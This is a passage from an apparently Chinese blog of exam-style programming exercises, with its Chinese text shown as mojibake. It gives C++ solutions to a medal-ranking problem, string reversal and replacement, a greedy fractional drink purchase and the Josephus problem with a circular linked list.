class="keyword">return</span> a.gold_per_person &gt; b.gold_per_person;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp4</span><span class="params">(struct country a, struct country b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.prize_per_person &gt; b.prize_per_person;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cn, acn;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; cn &gt;&gt; acn)&#123;</span><br><span class="line"><span class="keyword">if</span>(acn == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">country</span>* <span class="title">cty</span> =</span> <span class="keyword">new</span> struct country[cn];</span><br><span class="line"><span class="keyword">int</span> acn_id[acn];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line">cty[i].id = i;</span><br><span class="line"><span class="keyword">double</span> gold, prize, population;</span><br><span class="line">cin &gt;&gt; gold &gt;&gt; prize &gt;&gt; population;</span><br><span class="line">cty[i].gold_num = gold;</span><br><span class="line">cty[i].prize_num = prize;</span><br><span class="line">cty[i].gold_per_person = gold / population;</span><br><span class="line">cty[i].prize_per_person = prize / population;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acn; i++)&#123;</span><br><span class="line">cin &gt;&gt; acn_id[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡‘ç‰Œæ’å</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp1);</span><br><span class="line"><span class="keyword">int</span> rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">0</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].gold_num == cty[i<span class="number">-1</span>].gold_num)&#123;</span><br><span class="line">cty[i].rk[<span class="number">0</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">0</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">0</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¥–ç‰Œæ’å</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp2);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">1</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].prize_num == cty[i<span class="number">-1</span>].prize_num)&#123;</span><br><span class="line">cty[i].rk[<span class="number">1</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">1</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">1</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡‘ç‰Œäººå£æ¯”ä¾‹æ’å</span></span><br><span class="line"><span class="built_in">sort</span>(cty, cty+cn, cmp3);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">2</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].gold_per_person == cty[i<span class="number">-1</span>].gold_per_person)&#123;</span><br><span class="line">cty[i].rk[<span class="number">2</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">2</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">2</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¥–ç‰Œäººå£æ¯”ä¾‹æ’å</span></span><br><span class="line"><span class="built_in">stable_sort</span>(cty, cty+cn, cmp4);</span><br><span class="line">rk = <span class="number">1</span>;</span><br><span class="line">cty[<span class="number">0</span>].rk[<span class="number">3</span>] = rk++;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].prize_per_person == cty[i<span class="number">-1</span>].prize_per_person)&#123;</span><br><span class="line">cty[i].rk[<span class="number">3</span>] = cty[i<span class="number">-1</span>].rk[<span class="number">3</span>];</span><br><span class="line">rk++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> cty[i].rk[<span class="number">3</span>] = rk++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŒ‰è¾“å…¥é¡ºåºæ’å</span></span><br><span class="line"><span class="built_in">stable_sort</span>(cty, cty+cn, cmp0);</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(cty[i].id == acn_id[idx])&#123;</span><br><span class="line">idx++;</span><br><span class="line"><span class="keyword">int</span> min_rk = cty[i].rk[<span class="number">0</span>], mrk_id = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(min_rk &gt; cty[i].rk[j])&#123;</span><br><span class="line">min_rk = cty[i].rk[j];</span><br><span class="line">mrk_id = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:%d\n&quot;</span>, min_rk, mrk_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h2><p>å¯ä»¥sort+äºŒåˆ†ï¼Œä¹Ÿå¯ä»¥ç”¨mapï¼ˆå’Œpythonçš„dicæœ‰ç‚¹ç±»ä¼¼ï¼‰</p><h3 id="æŸ¥æ‰¾-åŒ—é‚®"><a href="#æŸ¥æ‰¾-åŒ—é‚®" class="headerlink" title="æŸ¥æ‰¾ - åŒ—é‚®"></a>æŸ¥æ‰¾ - åŒ—é‚®</h3><h5 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>  è¯»å…¥ä¸€ç»„å­—ç¬¦ä¸²ï¼ˆå¾…æ“ä½œçš„ï¼‰ï¼Œå†è¯»å…¥ä¸€ä¸ªint nè®°å½•è®°ä¸‹æ¥æœ‰å‡ æ¡å‘½ä»¤ï¼Œæ€»å…±æœ‰2ä¸­å‘½ä»¤ï¼š1ã€ç¿»è½¬ ä»ä¸‹æ ‡ä¸ºiçš„å­—ç¬¦å¼€å§‹åˆ°i+len-1ä¹‹é—´çš„å­—ç¬¦ä¸²å€’åºï¼›2ã€æ›¿æ¢ å‘½ä¸­å¦‚æœç¬¬ä¸€ä½ä¸º1ï¼Œç”¨å‘½ä»¤çš„ç¬¬å››ä½å¼€å§‹åˆ°æœ€åçš„å­—ç¬¦ä¸²æ›¿æ¢åŸè¯»å…¥çš„å­—ç¬¦ä¸²ä¸‹æ ‡ i åˆ° i+len-1çš„å­—ç¬¦ä¸²ã€‚æ¯æ¬¡æ‰§è¡Œä¸€æ¡å‘½ä»¤åæ–°çš„å­—ç¬¦ä¸²ä»£æ›¿æ—§çš„å­—ç¬¦ä¸²ï¼ˆå³ä¸‹ä¸€æ¡å‘½ä»¤åœ¨ä½œç”¨åœ¨å¾—åˆ°çš„æ–°å­—ç¬¦ä¸²ä¸Šï¼‰ã€‚   å‘½ä»¤æ ¼å¼ï¼šç¬¬ä¸€ä½0ä»£è¡¨ç¿»è½¬ï¼Œ1ä»£è¡¨æ›¿æ¢ï¼›ç¬¬äºŒä½ä»£è¡¨å¾…æ“ä½œçš„å­—ç¬¦ä¸²çš„èµ·å§‹ä¸‹æ ‡int iï¼›ç¬¬ä¸‰ä½è¡¨ç¤ºéœ€è¦æ“ä½œçš„å­—ç¬¦ä¸²é•¿åº¦int lenã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-3"><a href="#è¾“å…¥æè¿°-3" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æœ‰å¤šç»„æ•°æ®ã€‚</span><br><span class="line">æ¯ç»„è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆä¸å¤§äº<span class="number">100</span>ï¼‰ç„¶åè¾“å…¥<span class="built_in">n</span>ï¼Œå†è¾“å…¥<span class="built_in">n</span>æ¡æŒ‡ä»¤ï¼ˆæŒ‡ä»¤ä¸€å®šæœ‰æ•ˆï¼‰ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-3"><a href="#è¾“å‡ºæè¿°-3" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®æŒ‡ä»¤å¯¹å­—ç¬¦ä¸²æ“ä½œåè¾“å‡ºç»“æœã€‚</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²æ“ä½œï¼Œä¸»è¦ç”¨substr</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string str;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; str)&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">string opt, tmp, r;</span><br><span class="line"><span class="keyword">int</span> choice, start, len;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; opt;</span><br><span class="line">choice = opt[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">start = opt[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">len = opt[<span class="number">2</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">tmp = str.<span class="built_in">substr</span>(start, len);</span><br><span class="line"><span class="built_in">reverse</span>(tmp.<span class="built_in">begin</span>(), tmp.<span class="built_in">end</span>());</span><br><span class="line">r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">str = r;</span><br><span class="line">cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp = opt.<span class="built_in">substr</span>(<span class="number">3</span>);</span><br><span class="line">r = str.<span class="built_in">substr</span>(<span class="number">0</span>, start) + tmp + str.<span class="built_in">substr</span>(start+len);</span><br><span class="line">str = r;</span><br><span class="line">cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è´ªå¿ƒç®—æ³•"><a href="#è´ªå¿ƒç®—æ³•" class="headerlink" title="è´ªå¿ƒç®—æ³•"></a>è´ªå¿ƒç®—æ³•</h2><p>å½“å‰æœ€ä¼˜ï¼Œå¸¸ç”¨sortã€‚</p><h3 id="å–é¥®æ–™"><a href="#å–é¥®æ–™" class="headerlink" title="å–é¥®æ–™"></a>å–é¥®æ–™</h3><h5 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å•†åº—é‡Œæœ‰nä¸­é¥®æ–™ï¼Œç¬¬iç§é¥®æ–™æœ‰miæ¯«å‡ï¼Œä»·æ ¼ä¸ºwiã€‚</p><p>å°æ˜ç°åœ¨æ‰‹é‡Œæœ‰xå…ƒï¼Œä»–æƒ³åƒå°½é‡å¤šçš„é¥®æ–™ï¼Œäºæ˜¯å‘ä½ å¯»æ±‚å¸®åŠ©ï¼Œæ€ä¹ˆæ ·ä¹°æ‰èƒ½åƒçš„æœ€å¤šã€‚</p><p>è¯·æ³¨æ„ï¼Œæ¯ä¸€ç§é¥®æ–™éƒ½å¯ä»¥åªä¹°ä¸€éƒ¨åˆ†ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-2"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-2" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-4"><a href="#è¾“å…¥æè¿°-4" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å¤šç»„æµ‹è¯•æ•°æ®ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸¤ä¸ªéè´Ÿæ•´æ•°xå’Œ<span class="built_in">n</span>ã€‚</span><br><span class="line">æ¥ä¸‹æ¥<span class="built_in">n</span>è¡Œï¼Œæ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œåˆ†åˆ«ä¸ºmiå’Œwiã€‚</span><br><span class="line">æ‰€æœ‰æ•°æ®éƒ½ä¸å¤§äº<span class="number">1000</span>ã€‚</span><br><span class="line">xå’Œ<span class="built_in">n</span>éƒ½ä¸º-<span class="number">1</span>æ—¶ç¨‹åºç»“æŸã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-4"><a href="#è¾“å‡ºæè¿°-4" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¯·è¾“å‡ºå°æ˜æœ€å¤šèƒ½å–åˆ°å¤šå°‘æ¯«å‡çš„é¥®æ–™ï¼Œç»“æœä¿ç•™ä¸‰ä½å°æ•°ã€‚</span><br></pre></td></tr></table></figure><p>æ‰¾å‡ºå•ä½ä»·æ ¼æœ€å¤šé¥®æ–™çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">drink</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> m, w;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(struct drink a, struct drink b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a.m / a.w) &gt; (b.m / b.w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> x;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(x == <span class="number">-1</span> &amp;&amp; n == <span class="number">-1</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">struct drink dk[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; dk[i].m &gt;&gt; dk[i].w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sort</span>(dk, dk+n, cmp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(x &amp;&amp; idx &lt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; dk[idx].w)&#123;</span><br><span class="line">x -= dk[idx].w;</span><br><span class="line">r += dk[idx].m;</span><br><span class="line">idx++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r += dk[idx].m / dk[idx].w * x;</span><br><span class="line">x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.3lf\n&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é“¾è¡¨"><a href="#é“¾è¡¨" class="headerlink" title="é“¾è¡¨"></a>é“¾è¡¨</h2><h3 id="çŒ´å­æŠ¥æ•°"><a href="#çŒ´å­æŠ¥æ•°" class="headerlink" title="çŒ´å­æŠ¥æ•°"></a>çŒ´å­æŠ¥æ•°</h3><h5 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>nä¸ªçŒ´å­å›´åä¸€åœˆå¹¶æŒ‰ç…§é¡ºæ—¶é’ˆæ–¹å‘ä»1åˆ°nç¼–å·ï¼Œä»ç¬¬sä¸ªçŒ´å­å¼€å§‹è¿›è¡Œ1åˆ°mçš„æŠ¥æ•°ï¼ŒæŠ¥æ•°åˆ°ç¬¬mçš„çŒ´å­é€€å‡ºæŠ¥æ•°ï¼Œä»ç´§æŒ¨å®ƒçš„ä¸‹ä¸€ä¸ªçŒ´å­é‡æ–°å¼€å§‹1åˆ°mçš„æŠ¥æ•°ï¼Œå¦‚æ­¤è¿›è¡Œä¸‹å»çŸ¥é“æ‰€æœ‰çš„çŒ´å­éƒ½é€€å‡ºä¸ºæ­¢ã€‚æ±‚ç»™å‡ºè¿™nä¸ªçŒ´å­çš„é€€å‡ºçš„é¡ºåºè¡¨ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-3"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-3" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-5"><a href="#è¾“å…¥æè¿°-5" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ‰åšç»„æµ‹è¯•æ•°æ®ï¼æ¯ä¸€ç»„æ•°æ®æœ‰ä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œè¾“å…¥<span class="variable">n</span>ï¼ˆè¡¨ç¤ºçŒ´å­çš„æ€»æ•°æœ€å¤šä¸º<span class="number">100</span>ï¼‰ç¬¬äºŒè¡Œè¾“å…¥æ•°æ®<span class="function"><span class="title">s</span>(ä»ç¬¬<span class="variable">s</span>ä¸ªçŒ´å­å¼€å§‹æŠ¥æ•°)å’Œæ•°æ®<span class="title">m</span>(ç¬¬<span class="variable">m</span>ä¸ªçŒ´å­é€€å‡ºæŠ¥æ•°)ï¼å½“è¾“å…¥ï¼ã€€ï¼ã€€ï¼æ—¶è¡¨ç¤ºç¨‹åºç»“æŸï¼</span></span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-5"><a href="#è¾“å‡ºæè¿°-5" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ç»„æ•°æ®çš„è¾“å‡ºç»“æœä¸ºä¸€è¡Œï¼Œä¸­é—´ç”¨é€—å·é—´éš”ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function">struct node *<span class="title">setup</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span>, *<span class="title">tmp</span>, *<span class="title">pre</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">tmp = (struct node *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node));</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">head = tmp;</span><br><span class="line">pre = tmp;</span><br><span class="line">&#125;</span><br><span class="line">tmp-&gt;num = i;</span><br><span class="line">tmp-&gt;next = head;</span><br><span class="line">pre-&gt;next = tmp;</span><br><span class="line">pre = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct node *head, <span class="keyword">int</span> n, <span class="keyword">int</span> s, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">p</span>, *<span class="title">pre</span>;</span></span><br><span class="line">p = head;</span><br><span class="line">s--;</span><br><span class="line"><span class="keyword">while</span>(s)&#123;</span><br><span class="line">pre = p;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">s--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(p == p-&gt;next)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;num &lt;&lt; endl;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i % m == <span class="number">0</span>)&#123;</span><br><span class="line">cout &lt;&lt; p-&gt;num &lt;&lt; <span class="string">&quot;,&quot;</span>;</span><br><span class="line">pre-&gt;next = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> pre = p;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, s, m;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; s &gt;&gt; m)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> &amp;&amp; s == <span class="number">0</span> &amp;&amp; m == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">struct node *head;</span><br><span class="line">head = <span class="built_in">setup</span>(n);</span><br><span class="line"><span class="built_in">print</span>(head, n, s, m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•é“¾è¡¨"><a href="#å•é“¾è¡¨" class="headerlink" title="å•é“¾è¡¨"></a>å•é“¾è¡¨</h3><h5 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>è®¾èŠ‚ç‚¹å®šä¹‰å¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 